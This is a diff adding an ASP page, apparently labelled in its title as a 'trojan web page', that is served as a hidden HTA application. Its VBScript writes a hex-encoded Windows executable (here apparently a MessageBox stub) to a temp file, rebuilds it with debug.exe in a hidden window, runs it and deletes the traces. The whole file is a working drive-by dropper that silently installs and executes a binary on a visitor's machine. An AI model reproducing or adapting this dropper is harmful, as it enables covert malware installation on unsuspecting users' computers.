@@ -1,0 +1,153 @@
+<%Response.ContentType="Application/Hta"%>
+<hta:application height="0" width="0" caption="no" border="none" showintaskbar="no">
+<html>
+<head>
+<title>Ä¾ÂíÍøÒ³£¨Ô­´´: chin£©</title>
+<script language="JavaScript">
+<!--
+window.moveTo(0,0);
+window.resizeTo(0,0);
+//-->
+</script>
+</head>
+<body>
+<script language="VBScript">
+<!--
+On Error Resume Next
+
+dim WSHshell,fs,a
+dim fn_tmp,fn_com,fn_exe
+Set WSHshell=CreateObject("Wscript.Shell")
+Set fs=CreateObject("Scripting.FileSystemObject")
+fn_tmp=fs.GetSpecialFolder(2)&Chr(92)&Right(fs.GetTempName,8)
+fn_com=Replace(fn_tmp,".tmp",".com",1,-1,1)
+fn_exe=Replace(fn_tmp,".tmp",".exe",1,-1,1)
+
+Set a=fs.CreateTextFile(fn_tmp,1)
+a.Write "e100 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00"&vbCrLf
+a.Write "e110 B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e130 00 00 00 00 00 00 00 00 00 00 00 00 B0 00 00 00"&vbCrLf
+a.Write "e140 0E 1F BA 0E 00 B4 09 CD 21 B8 01 4C CD 21 54 68"&vbCrLf
+a.Write "e150 69 73 20 70 72 6F 67 72 61 6D 20 63 61 6E 6E 6F"&vbCrLf
+a.Write "e160 74 20 62 65 20 72 75 6E 20 69 6E 20 44 4F 53 20"&vbCrLf
+a.Write "e170 6D 6F 64 65 2E 0D 0D 0A 24 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e180 63 0C 05 DB 27 6D 6B 88 27 6D 6B 88 27 6D 6B 88"&vbCrLf
+a.Write "e190 27 6D 6B 88 20 6D 6B 88 A4 71 65 88 26 6D 6B 88"&vbCrLf
+a.Write "e1A0 52 69 63 68 27 6D 6B 88 00 00 00 00 00 00 00 55"&vbCrLf
+a.Write "e1B0 50 45 00 00 4C 01 02 00 50 79 A5 36 00 00 00 00"&vbCrLf
+a.Write "e1C0 00 00 00 00 E0 00 0F 01 0B 01 05 0C 00 02 00 00"&vbCrLf
+a.Write "e1D0 00 02 00 00 00 00 00 00 00 10 00 00 00 10 00 00"&vbCrLf
+a.Write "e1E0 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00"&vbCrLf
+a.Write "e1F0 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e200 00 30 00 00 00 02 00 00 00 00 00 00 02 00 00 00"&vbCrLf
+a.Write "e210 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00"&vbCrLf
+a.Write "e220 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e230 10 20 00 00 3C 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e240 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e250 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e260 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e270 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e280 00 00 00 00 00 00 00 00 00 20 00 00 10 00 00 00"&vbCrLf
+a.Write "e290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e2A0 00 00 00 00 00 00 00 00 2E 74 65 78 74 00 00 00"&vbCrLf
+a.Write "e2B0 5C 00 00 00 00 10 00 00 00 02 00 00 00 02 00 00"&vbCrLf
+a.Write "e2C0 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60"&vbCrLf
+a.Write "e2D0 2E 72 64 61 74 61 00 00 92 00 00 00 00 20 00 00"&vbCrLf
+a.Write "e2E0 00 02 00 00 00 04 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e2F0 00 00 00 00 40 00 00 40 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e300 EB 33 4D 69 6E 69 6D 75 6D 20 4D 41 53 4D 00 20"&vbCrLf
+a.Write "e310 20 2D 2D 2D 20 41 73 73 65 6D 62 6C 65 72 20 50"&vbCrLf
+a.Write "e320 75 72 65 20 61 6E 64 20 53 69 6D 70 6C 65 20 2D"&vbCrLf
+a.Write "e330 2D 2D 20 20 00 6A 00 68 02 10 40 00 68 0F 10 40"&vbCrLf
+a.Write "e340 00 6A 00 E8 08 00 00 00 6A 00 E8 07 00 00 00 CC"&vbCrLf
+a.Write "e350 FF 25 08 20 40 00 FF 25 00 20 40 00 00 00 00 00"&vbCrLf
+a.Write "e360 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e370 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e380 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e390 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e3A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e3B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e3C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e3D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e3E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e3F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e4A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e4B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e4C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e4D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e4E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e4F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e500 76 20 00 00 00 00 00 00 5C 20 00 00 00 00 00 00"&vbCrLf
+a.Write "e510 54 20 00 00 00 00 00 00 00 00 00 00 6A 20 00 00"&vbCrLf
+a.Write "e520 08 20 00 00 4C 20 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e530 84 20 00 00 00 20 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e540 00 00 00 00 00 00 00 00 00 00 00 00 76 20 00 00"&vbCrLf
+a.Write "e550 00 00 00 00 5C 20 00 00 00 00 00 00 BB 01 4D 65"&vbCrLf
+a.Write "e560 73 73 61 67 65 42 6F 78 41 00 55 53 45 52 33 32"&vbCrLf
+a.Write "e570 2E 64 6C 6C 00 00 75 00 45 78 69 74 50 72 6F 63"&vbCrLf
+a.Write "e580 65 73 73 00 4B 45 52 4E 45 4C 33 32 2E 64 6C 6C"&vbCrLf
+a.Write "e590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e5A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e5B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e5C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e5D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e5E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e5F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e6A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e6B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e6C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e6D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e6E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "e6F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"&vbCrLf
+a.Write "rcx"&vbCrLf
+a.Write "600"&vbCrLf
+a.Write "n "&fn_com&vbCrLf
+a.Write "w"&vbCrLf
+a.Write "q"&vbCrLf
+a.Close
+WSHshell.Run "command.com /c debug.exe<"&fn_tmp,0,1
+WSHshell.Run "cmd.exe /c debug.exe<"&fn_tmp,0,1
+
+Do
+    If fs.FileExists(fn_com)=True Then        
+        Chg_Run
+        Exit Do
+    End If   
+Loop
+
+Sub Chg_Run
+    fs.CopyFile fn_com,fn_exe,1
+    WSHshell.Run fn_exe
+End Sub
+
+fs.DeleteFile fn_tmp,1
+fs.DeleteFile fn_com,1
+Set fs=Nothing
+Set WSHshell=Nothing
+
+window.close
+//-->
+</script>
+</body>
+</html>
